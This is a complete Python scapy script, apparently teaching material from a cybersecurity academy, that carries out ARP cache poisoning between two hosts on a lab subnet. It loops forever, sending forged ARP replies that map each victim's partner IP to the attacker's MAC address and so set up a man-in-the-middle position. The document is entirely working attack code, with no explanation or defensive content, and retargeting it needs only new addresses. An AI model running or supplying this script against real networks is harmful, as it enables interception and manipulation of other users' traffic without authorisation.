#!/usr/bin/python3

# Yara Cybersecurity Academy
# yaracybersec.com
# Author: Yara Altehini
# 2020

from scapy.all import *

VICTIM1_IP = "10.0.2.5"
VICTIM1_MAC = "08:00:27:7d:f0:89"
VICTIM2_IP = "10.0.2.6"
VICTIM2_MAC = "08:00:27:f7:bf:67"
ATTACKER_MAC = "08:00:27:7b:2a:af"

def launch_arp_poisoning(dest_mac, src_ip, src_mac):
	ether_hdr = Ether()
	ether_hdr.dst = dest_mac
	arp_hdr = ARP()
	arp_hdr.psrc = src_ip
	arp_hdr.hwsrc = src_mac
	arp_hdr.op = 2 
	frame = ether_hdr/arp_hdr
	sendp(frame, verbose=0)

while True:
    launch_arp_poisoning(VICTIM1_MAC, VICTIM2_IP, ATTACKER_MAC)
    launch_arp_poisoning(VICTIM2_MAC, VICTIM1_IP, ATTACKER_MAC)